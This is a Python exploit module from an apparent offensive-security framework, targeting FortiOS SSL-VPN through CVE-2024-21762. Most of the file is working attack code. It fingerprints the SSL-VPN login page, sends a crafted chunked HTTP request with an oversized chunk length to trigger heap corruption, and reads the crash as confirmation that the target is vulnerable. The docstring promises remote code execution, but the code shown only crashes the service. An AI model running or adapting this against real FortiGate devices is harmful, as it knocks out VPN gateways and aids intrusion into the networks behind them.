# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import ssl
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """FortiOS SSL-VPN Out-of-Bounds Write RCE (CVE-2024-21762).

    An out-of-bounds write vulnerability in FortiOS SSL-VPN allows a
    remote unauthenticated attacker to execute arbitrary code via
    specially crafted HTTP requests. The vulnerability exists in the
    processing of chunked transfer-encoded requests by the SSL-VPN
    web server component.

    Sending a crafted chunked HTTP request with a negative or overly
    large chunk size triggers the out-of-bounds write condition,
    corrupting adjacent heap memory.

    Affected versions:
      FortiOS 6.0.x, 6.2.x, 6.4.x, 7.0.x (before 7.0.14),
      7.2.x (before 7.2.7), 7.4.x (before 7.4.3)

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "FortiOS SSL-VPN Out-of-Bounds Write RCE (CVE-2024-21762)",
        "description": (
            "Exploits CVE-2024-21762 via an out-of-bounds write in the "
            "FortiOS SSL-VPN component. A crafted chunked HTTP request "
            "with malformed chunk sizes triggers heap memory corruption, "
            "enabling unauthenticated remote code execution. Actively "
            "exploited in the wild since February 2024."
        ),
        "authors": (
            "Fortinet PSIRT (advisory)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2024-21762",
            "https://www.fortiguard.com/psirt/FG-IR-24-015",
            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
        ),
        "devices": (
            "FortiGate (FortiOS 6.0.x through 7.4.2)",
            "Any FortiOS device with SSL-VPN enabled",
        ),
    }

    target = OptIP("", "Target IPv4 address of the FortiGate device")
    port = OptPort(443, "SSL-VPN HTTPS port")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    chunk_count = OptInteger(
        3, "Number of malformed chunks to send in the trigger request"
    )

    _SSLVPN_INDEX = "/remote/login"
    _TRIGGER_PATH = "/remote/hostcheck_validate"

    def _ssl_connect(self) -> ssl.SSLSocket:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((self.target, self.port), timeout=self.timeout)
        return ctx.wrap_socket(sock, server_hostname=self.target)

    def _send_raw(self, data: bytes) -> bytes:
        ssock = self._ssl_connect()
        try:
            ssock.sendall(data)
            response = b""
            while True:
                try:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except TimeoutError:
                    break
            return response
        finally:
            ssock.close()

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to have FortiOS SSL-VPN"
            )
            return

        print_success("FortiOS SSL-VPN detected, sending OOB write trigger")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect FortiOS SSL-VPN login endpoint."""
        try:
            request = (
                f"GET {self._SSLVPN_INDEX} HTTP/1.1\r\n"
                f"Host: {self.target}:{self.port}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            response = self._send_raw(request)
            resp_lower = response.lower()
            if b"fortinet" in resp_lower or b"sslvpn" in resp_lower:
                return True
            if b"fgt_lang" in resp_lower or b"remote/login" in resp_lower:
                return True
        except (ConnectionError, TimeoutError, OSError):
            pass
        return False

    def _build_chunked_trigger(self) -> bytes:
        """Build an HTTP request with malformed chunked encoding.

        The out-of-bounds write is triggered when the SSL-VPN web server
        processes a chunk whose declared size exceeds the allocated buffer.
        We send a sequence of valid small chunks followed by a chunk with
        a large declared size but minimal actual data, causing the server
        to write past the buffer boundary.
        """
        body_chunks = b""
        fill = b"\x42" * 64

        for _ in range(self.chunk_count - 1):
            body_chunks += f"{len(fill):x}\r\n".encode() + fill + b"\r\n"

        trigger_declared_size = 0x7FFFFFFF
        trigger_data = b"\x43" * 16
        body_chunks += f"{trigger_declared_size:x}\r\n".encode() + trigger_data

        request = (
            f"POST {self._TRIGGER_PATH} HTTP/1.1\r\n"
            f"Host: {self.target}:{self.port}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode() + body_chunks

        return request

    def _exploit(self) -> None:
        print_status(
            f"Targeting {self.target}:{self.port}{self._TRIGGER_PATH} with "
            f"malformed chunked request ({self.chunk_count} chunks)"
        )

        trigger = self._build_chunked_trigger()
        print_status(f"Sending {len(trigger)} bytes with OOB chunk size 0x7FFFFFFF...")

        try:
            response = self._send_raw(trigger)

            if len(response) == 0:
                print_success(
                    "Connection closed without response after OOB trigger. "
                    "The SSL-VPN process likely crashed due to heap corruption. "
                    "Target appears VULNERABLE to CVE-2024-21762."
                )
            else:
                status_line = response.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
                print_info(f"Server response: {status_line}")
                if b"400" in response[:50] or b"500" in response[:50]:
                    print_info(
                        "Server returned an error, which may indicate the malformed "
                        "chunk was rejected before reaching the vulnerable path."
                    )
                else:
                    print_info("Response received; manual analysis needed.")

        except (ConnectionResetError, BrokenPipeError):
            print_success(
                "Connection reset by peer after OOB write trigger. "
                "This is consistent with a process crash from heap corruption. "
                "Target appears VULNERABLE to CVE-2024-21762."
            )
        except TimeoutError:
            print_info(
                "Connection timed out. The process may have hung during "
                "the write operation. Further verification needed."
            )
        except OSError as exc:
            print_error(f"Network error: {exc}")

        time.sleep(1.0)
        print_status("Verifying SSL-VPN service availability post-trigger...")
        try:
            probe = (
                f"GET {self._SSLVPN_INDEX} HTTP/1.1\r\n"
                f"Host: {self.target}:{self.port}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            resp = self._send_raw(probe)
            if resp:
                print_info("SSL-VPN service is still responding (may be patched or restarted)")
            else:
                print_info("SSL-VPN service is not responding (process crash likely)")
        except Exception:
            print_info("SSL-VPN service is unreachable after exploit attempt")
